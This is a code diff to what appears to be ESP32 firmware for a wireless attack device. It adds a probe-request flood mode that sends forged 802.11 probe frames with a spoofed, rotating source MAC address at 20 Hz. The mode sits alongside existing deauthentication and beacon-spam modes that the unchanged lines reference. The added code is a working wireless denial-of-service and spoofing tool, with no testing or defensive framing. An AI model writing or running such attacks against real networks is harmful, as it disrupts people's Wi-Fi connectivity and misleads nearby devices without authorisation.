@@ -20,6 +20,22 @@ static const uint8_t kDeauthTemplate[26] = {
     0x07, 0x00,                          // Reason: class 3 frame from nonassociated
 };
 
+// ── Probe Request frame header (802.11 Management, Subtype=4) ────────────────
+// 24-byte header: DA=broadcast, SA=filled at runtime (randomised), BSSID=broadcast.
+// SSID IE and Supported Rates IE are appended in probeLoop().
+static const uint8_t kProbeReqHeader[24] = {
+    0x40, 0x00,                          // Frame control: probe request
+    0x00, 0x00,                          // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: randomised per-burst (offset 10)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: wildcard
+    0x00, 0x00,                          // Sequence control
+};
+static const uint8_t kSupportedRates[10] = {
+    0x01, 0x08,
+    0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
+};
+
 // ── Beacon frame template (minimal, 802.11 Management, Subtype=8) ────────────
 // Bytes 10..11 = frame body offset; SSID IE at byte 36.
 static const uint8_t kBeaconTemplate[38] = {
@@ -59,6 +75,7 @@ void Esp32WifiRadio::stop() {
     monitorClose();   // disable promiscuous before thread exits
     doDeauth_ = false;
     doBeacon_ = false;
+    doProbe_  = false;
     loopThread_.requestStop();
     loopThread_.join();
 }
@@ -134,6 +151,7 @@ bool Esp32WifiRadio::deauthStart(std::string_view bssid, uint8_t channel) {
     if (!parseBssid(bssid, deauthBssid_)) return false;
     deauthChannel_ = channel;
     doBeacon_      = false;
+    doProbe_       = false;
     doDeauth_      = true;
     return true;
 }
@@ -147,7 +165,23 @@ bool Esp32WifiRadio::beaconSpamStart(const std::vector<std::string>& ssids) {
     std::lock_guard<std::mutex> g(mu_);
     beaconSsids_ = ssids;
     doDeauth_    = false;
+    doProbe_     = false;
     doBeacon_    = true;
+    return true;
+}
+
+bool Esp32WifiRadio::probeFloodStart(std::string_view ssid, uint8_t channel) {
+    std::lock_guard<std::mutex> g(mu_);
+    probeSsid_    = std::string(ssid);
+    probeChannel_ = channel;
+    doDeauth_     = false;
+    doBeacon_     = false;
+    doProbe_      = true;
+    return true;
+}
+
+bool Esp32WifiRadio::probeFloodStop() {
+    doProbe_ = false;
     return true;
 }
 
@@ -161,6 +195,7 @@ void Esp32WifiRadio::loopEntry(void* self) {
     while (!r->loopThread_.shouldStop()) {
         if      (r->doDeauth_) r->deauthLoop();
         else if (r->doBeacon_) r->beaconLoop();
+        else if (r->doProbe_)  r->probeLoop();
         else    Thread::sleepMs(10);
     }
 }
@@ -190,6 +225,41 @@ void Esp32WifiRadio::deauthLoop() {
     pushEvent("deauth_sent", buf);
 
     Thread::sleepMs(100);
+}
+
+void Esp32WifiRadio::probeLoop() {
+    std::string ssid;
+    uint8_t ch;
+    {
+        std::lock_guard<std::mutex> g(mu_);
+        ssid = probeSsid_;
+        ch   = probeChannel_;
+    }
+
+    // Rotate the last SA byte to simulate different source devices.
+    static uint8_t probeSeq = 0;
+    uint8_t frame[100];
+    size_t pos = sizeof(kProbeReqHeader);
+    std::memcpy(frame, kProbeReqHeader, sizeof(kProbeReqHeader));
+    frame[10] = 0xDE; frame[11] = 0xAD; frame[12] = 0xBE;
+    frame[13] = 0xEF; frame[14] = 0xCA; frame[15] = probeSeq++;
+
+    // SSID IE: tag=0x00, len, ssid bytes (len=0 → wildcard)
+    size_t ssidLen = ssid.size() > 32 ? 32 : ssid.size();
+    frame[pos++] = 0x00;
+    frame[pos++] = static_cast<uint8_t>(ssidLen);
+    std::memcpy(frame + pos, ssid.c_str(), ssidLen);
+    pos += ssidLen;
+
+    // Supported Rates IE
+    std::memcpy(frame + pos, kSupportedRates, sizeof(kSupportedRates));
+    pos += sizeof(kSupportedRates);
+
+    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(pos), false);
+
+    pushEvent("probe_sent", "{}");
+    Thread::sleepMs(50);  // 20 Hz
 }
 
 void Esp32WifiRadio::beaconLoop() {
